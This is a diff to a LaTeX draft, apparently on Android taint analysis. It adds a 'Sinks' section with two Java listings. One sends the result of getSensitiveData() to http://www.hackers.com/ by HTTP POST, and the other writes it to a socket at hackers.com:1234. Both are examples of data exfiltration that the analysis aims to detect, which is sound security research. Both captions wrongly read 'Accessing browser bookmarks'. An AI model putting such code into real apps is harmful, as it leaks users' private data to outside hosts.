@@ -632,6 +632,44 @@ while (c.moveToNext()) {
 
 \section{Sinks}
 
+\subsection{API Calls}
+
+\begin{figure}[h]
+	\centering
+	\begin{tabular}{c}
+	\begin{lstlisting}
+String data = getSensitiveData();
+List<NameValuePair> pairs = Arrays.asList(new BasicNameValuePair("postedData", data));
+HttpEntity postData = new UrlEncodedFormEntity(pairs);
+HttpPost post = new HttpPost("http://www.hackers.com/");
+post.setEntity(postData);
+DefaultHttpClient client = new DefaultHttpClient();
+client.execute(post); // check this	
+	\end{lstlisting}
+	\end{tabular}
+	\begin{lstlisting}[caption={Accessing browser bookmarks},
+	                   label={listing:Sink_ApacheHTTPClient}]
+	\end{lstlisting}
+\end{figure}
+
+\subsection{Writer Interface}
+
+\begin{figure}[h]
+	\centering
+	\begin{tabular}{c}
+	\begin{lstlisting}
+String data = getSensitiveData();
+Socket s = new Socket("hackers.com", 1234); // TAINT_SINK_NET
+PrintWriter outNet = new PrintWriter(s.getOutputStream(), true);
+outNet.println(data);
+outNet.close();
+	\end{lstlisting}
+	\end{tabular}
+	\begin{lstlisting}[caption={Accessing browser bookmarks},
+	                   label={listing:Sink_Socket}]
+	\end{lstlisting}
+\end{figure}
+
 \section{Requirements Analysis}
 look at AdCache
 
